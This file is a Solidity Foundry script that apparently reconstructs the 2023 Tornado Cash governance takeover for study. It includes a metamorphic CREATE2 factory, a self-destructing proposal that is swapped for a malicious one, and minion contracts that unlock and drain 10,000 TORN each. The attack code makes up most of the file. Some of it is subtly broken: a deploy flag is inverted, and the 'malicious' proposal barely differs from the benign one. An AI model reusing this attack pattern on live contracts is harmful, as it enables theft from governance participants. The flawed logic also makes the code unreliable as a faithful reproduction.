// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/Vm.sol";

import {TestHarness} from "../../TestHarness.sol";

import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {Ownable} from "./AttackerOwnable.sol";
import "./TornadoGovernance.interface.sol";

contract Exploit_TornadoCashGovernanceS is Script, TestHarness {
    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);

    uint256 ATT1_Key = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 ATT2_Key = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    address ATTACKER1 = vm.rememberKey(ATT1_Key);
    address ATTACKER2 = vm.rememberKey(ATT2_Key);

    address whale = 0xF977814e90dA44bFA03b6295A0616a897441aceC;

    ReinitializableContractFactory proposalFactory;
    TransientContract transientContract;
    Proposal_20 proposal_20;

    function setUp() public {
        // cheat.createSelectFork("mainnet", 17_248_593); // The block where the step 0. happens.

        // The attacker used two accounts
        // cheat.deal(ATTACKER1, 0.5 ether);
        // cheat.deal(ATTACKER2, 0.5 ether);

        //  This contract would play the role of the Attacker Contract
        // cheat.deal(address(this), 0.5 ether);
    }

    function run() external {
        console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL ========");
        // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
        // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0
        vm.startBroadcast(ATTACKER2);
        // _deployFactoryAndProposal();
        // _initialTornLock();
        _swapEthForTorn();

        vm.stopBroadcast();

        console2.log("\n======== STEP 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
        // 3. Selfdestruct both the proposal and transient contract
        // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0

        // vm.startBroadcast(ATTACKER2);
        // proposalFactory.emergencyStop();
        // vm.stopBroadcast();

        // console2.log("WOLOLO");
        // console2.log(address(proposal_20).code.length);
        // console2.log(address(transientContract).code.length);

        // console2.log("\n======== STEP 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
        // vm.startBroadcast(ATTACKER2);
        // _redeployTransientAndProposal();
        // vm.stopBroadcast();
    }

    function _swapEthForTorn() internal {
        // We emulate the swap with a token transfer from a Whale (getting 1017 TORN)
        // Swap 1 https://etherscan.io/tx/0x82dca5a88a43377cab4748073a3a46c8aa120d42c5c5d802789cf17df22f0acd
        // Swap 2 https://etherscan.io/tx/0x6d3445d633de3d9c9dfdd4ca75cab9ff2cd269ec6d124baf2cd11cd177d04850
        anvil_impersonate_whale();
        vm.prank(whale);
        tornToken.transfer(ATTACKER2, 1017 ether);
        anvil_stop_impersonation();

        assertEq(tornToken.balanceOf(ATTACKER2), 1017 ether, "torn token balance mismatch");
        console2.log(tornToken.balanceOf(ATTACKER2));
    }

    function _deployFactoryAndProposal() internal {
        // Deploy the factory
        proposalFactory = new ReinitializableContractFactory();
        console2.log("Proposal Factory deployed at: %s", address(proposalFactory));

        // Deploy the proposal through a transient deploying the benign proposal
        (address proposal, address transient) =
            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), false);

        proposal_20 = Proposal_20(proposal);
        transientContract = TransientContract(transient);

        // Check the transient contract with a read method:
        address preCalcTransientContract =
            proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));

        assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient contract");
        assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");

        console2.log("Transient deployed at: %s", address(transientContract));
        console2.log("Proposal 20 deployed at: %s", address(proposal_20));
    }

    function _redeployTransientAndProposal() internal {
        // Deploy the malicious proposal through a transient
        (address proposal, address transient) =
            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), true);

        proposal_20 = Proposal_20(proposal);
        transientContract = TransientContract(transient);

        // Check the transient contract with a read method:
        address preCalcTransientContract =
            proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));

        assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient contract");
        assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");

        console2.log("Transient deployed at: %s", address(transientContract));
        console2.log("Proposal 20 deployed at: %s", address(proposal_20));
    }

    function _labelAccounts() internal {
        cheat.label(address(tornToken), "TORN");

        cheat.label(address(this), "ATTACKER CONTRACT");
    }
}
// Factory capable of deploying contracts that selfdestruct changing their implementation
// using a combination of create2 and create with a transient contract
// Deployed at tx:
// https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a
// We use the implementation to reproduce metamorphic contracts made by 0age:
// https://github.com/0age/metamorphic

contract ReinitializableContractFactory is Ownable {
    address public proposal;
    address public transient;
    bool public deployMaliciousProposal;

    /**
     * @dev impl by 0age
     * @dev Modifier to ensure that the first 20 bytes of a submitted salt match
     * those of the calling account. This provides protection against the salt
     * being stolen by frontrunners or other attackers.
     * @param salt bytes32 The salt value to check against the calling address.
     */
    modifier containsCaller(bytes32 salt) {
        // prevent contract submissions from being stolen from tx.pool by requiring
        // that the first 20 bytes of the submitted salt match msg.sender.
        require(
            address(bytes20(salt)) == msg.sender,
            "Invalid salt - first 20 bytes of the salt must match calling address."
        );
        _;
    }

    // This function implements the logic behind the deployment for a proposal via a transient
    // contract
    // First, the transient contract is deployed with Create2 and then the latter deploys the
    // proposal with Create
    // More details:
    // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
    // Method called after: 0xce40d339 in the attacker's contract factory
    function createProposalWithTransient(bytes32 _salt, bool _deployMaliciousProposal)
        public
        payable
        containsCaller(_salt)
        returns (address proposalContractAddress, address deployedTransientContract)
    {
        // Write the global
        deployMaliciousProposal = _deployMaliciousProposal;

        // determine the address of the transient contract.
        address transientContractAddress = getTransientContractAddress(_salt);

        // Create the transient with create2
        deployedTransientContract = address(new TransientContract{salt: _salt}());

        console2.log(deployedTransientContract, transientContractAddress);

        // ensure that the contracts were successfully deployed.
        require(
            deployedTransientContract == transientContractAddress,
            "Failed to deploy transient contract using given salt and init code."
        );

        proposalContractAddress = _getProposalAddress(transientContractAddress);
        proposal = proposalContractAddress;
        transient = deployedTransientContract;
    }

    // Precompute with create2
    function getTransientContractAddress(bytes32 salt) public view returns (address) {
        // determine the address of the transient contract.
        return address(
            uint160( // downcast to match the address type.
                uint256( // convert to uint to truncate upper digits.
                    keccak256( // compute the CREATE2 hash using 4 inputs.
                        abi.encodePacked( // pack all inputs to the hash together.
                            hex"ff", // start with 0xff to distinguish from RLP.
                            address(this), // this contract will be the caller.
                            salt, // pass in the supplied salt value.
                            keccak256(type(TransientContract).creationCode) // init
                                // code hash.
                        )
                    )
                )
            )
        );
    }

    // The proposal address will depend on the sender and its nonce.
    // As the nonce is reset when destructing, it will always be 1.
    function _getProposalAddress(address transientContractAddress) internal pure returns (address) {
        return address(
            uint160( // downcast to match the address type.
                uint256( // set to uint to truncate upper digits.
                    keccak256( // compute CREATE hash via RLP encoding.
                        abi.encodePacked( // pack all inputs to the hash together.
                            bytes1(0xd6), // first RLP byte.
                            bytes1(0x94), // second RLP byte.
                            transientContractAddress, // called by the transient contract.
                            bytes1(0x01) // nonce begins at 1 for contracts.
                        )
                    )
                )
            )
        );
    }

    function emergencyStop() external onlyOwner {
        console2.log("Triggering destruction of transient and proposal...");
        TransientContract(transient).emergencyStop();
        console2.log("Successfully destroyed proposal and transient");
    }
}

contract TransientContract is Ownable {
    // The owner of this contract will be the Factory

    address public factory;
    address public proposal;

    constructor() {
        factory = msg.sender;

        // Transfer the ownership of this contract to the factory
        _transferOwnership(factory);

        // Deployment of Proposal
        // retrieve the target implementation address from creator of this contract.
        address proposalContractAddress;
        bool deployMalicious = IReinitializableContractFactory(msg.sender).deployMaliciousProposal();

        if (deployMalicious) {
            proposalContractAddress = address(new Proposal_20());
        } else {
            proposalContractAddress = address(new Malicious_Proposal_20());
        }

        // ensure that the contract was successfully deployed.
        require(proposalContractAddress != address(0));
        proposal = proposalContractAddress;
    }

    // The attacker named this function after "emergencyStop"
    // More details:
    // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=1&debugLine=1
    // This call first triggers the destruction of the Proposal and then its own.
    function emergencyStop() external onlyOwner {
        IMaliciousSelfDestruct(proposal).emergencyStop(); // Destroy the proposal
        console2.log("Destroying transient...");
        selfdestruct(payable(owner())); // Destroy this
    }
}

// The initial malicious proposal implementation could be debugged here:
// https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=3&debugLine=3
// The attacker said that this would have the same impl as Proposal 16
// https://etherscan.io/address/0xd4b776caf2a39aeceb21a5dd7812082e2391b03d#code
contract Proposal_20 is Ownable {
    function getNullifiedTotal(address[4] memory relayers) public returns (uint256) {
        uint256 nullifiedTotal;

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;

        for (uint8 x = 0; x < relayers.length; x++) {
            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);
        }

        return nullifiedTotal;
    }

    function executeProposal() external {
        address[4] memory VIOLATING_RELAYERS = [
            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth
            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth
            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth
            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth
        ];

        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;
        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;

        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);

        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);
    }

    function emergencyStop() public onlyOwner {
        console2.log("Destroying proposal...");
        selfdestruct(payable(0));
    }
}

contract Malicious_Proposal_20 is Ownable {
    function getNullifiedTotal(address[4] memory relayers) public returns (uint256) {
        uint256 nullifiedTotal;

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;

        for (uint8 x = 0; x < relayers.length; x++) {
            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);
        }

        return nullifiedTotal;
    }

    function executeProposal() external {
        address[4] memory VIOLATING_RELAYERS = [
            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth
            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth
            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth
            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth
        ];

        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;
        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;

        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);

        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);

        // Added asm code to sstore
        uint256 newVar; // add some provisory var to change the bytecode of this
    }

    function emergencyStop() public onlyOwner {
        console2.log("Destroying proposal...");
        selfdestruct(payable(0));
    }
}

contract Attacker1Contract {
    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
    address[] minionContracts;

    function deployMultipleContracts(uint256 amount) external {
        address newMinion;
        for (uint256 i = 0; i < amount;) {
            console2.log("Deploying and preparing minion #%s", i + 1);
            newMinion = address(new Attacker1Minion());
            minionContracts.push(newMinion);

            tornToken.transferFrom(msg.sender, newMinion, 0);
            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.APPROVE);
            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.LOCK);

            unchecked {
                ++i;
            }
        }
    }

    function triggerUnlock() external {
        uint256 amountOfMinions = minionContracts.length;
        for (uint256 i = 0; i < amountOfMinions;) {
            address currentMinion = minionContracts[i];
            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.UNLOCK);
            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.TRANSFER);

            unchecked {
                ++i;
            }
        }
    }
}

contract Attacker1Minion {
    enum AttackInstruction {
        APPROVE,
        LOCK,
        UNLOCK,
        TRANSFER
    }

    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);

    address owner;

    constructor() {
        owner = msg.sender;
    }

    // this function has the signature 0x93d3a7b6 on each minion contract
    // The attacker calls this function many times but with different traces, meaning that has some
    // type of control flow
    function attackTornado(AttackInstruction instruction) external {
        if (instruction == AttackInstruction.APPROVE) {
            tornToken.approve(address(TORNADO_GOVERNANCE), 0);
        } else if (instruction == AttackInstruction.LOCK) {
            TORNADO_GOVERNANCE.lockWithApproval(0);
        } else if (instruction == AttackInstruction.UNLOCK) {
            TORNADO_GOVERNANCE.unlock(10_000 ether); // 10000000000000000000000
        } else if (instruction == AttackInstruction.TRANSFER) {
            tornToken.transfer(owner, 10_000 ether);
        }
    }
}
